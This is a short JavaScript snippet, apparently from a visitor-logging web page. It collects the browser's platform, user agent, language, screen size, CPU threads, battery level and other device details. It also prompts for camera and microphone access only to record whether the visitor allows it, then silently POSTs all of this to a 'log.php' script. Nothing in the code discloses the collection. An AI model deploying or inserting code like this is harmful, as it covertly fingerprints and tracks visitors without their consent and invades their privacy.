
navigator.getBattery().then(battery => {
  const data = {
    ip: 'auto', 
    os: navigator.platform,
    browser: navigator.userAgent,
    language: navigator.language,
    threads: navigator.hardwareConcurrency,
    cookies: navigator.cookieEnabled,
    touch: navigator.maxTouchPoints,
    doNotTrack: navigator.doNotTrack,
    screen: screen.width + 'x' + screen.height,
    battery: battery.level * 100 + '%',
    charging: battery.charging,
  };

  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(() => data.camera = 'Permission GRANTED')
    .catch(() => data.camera = 'Permission DENIED')
    .finally(() => {
      fetch('log.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    });
});
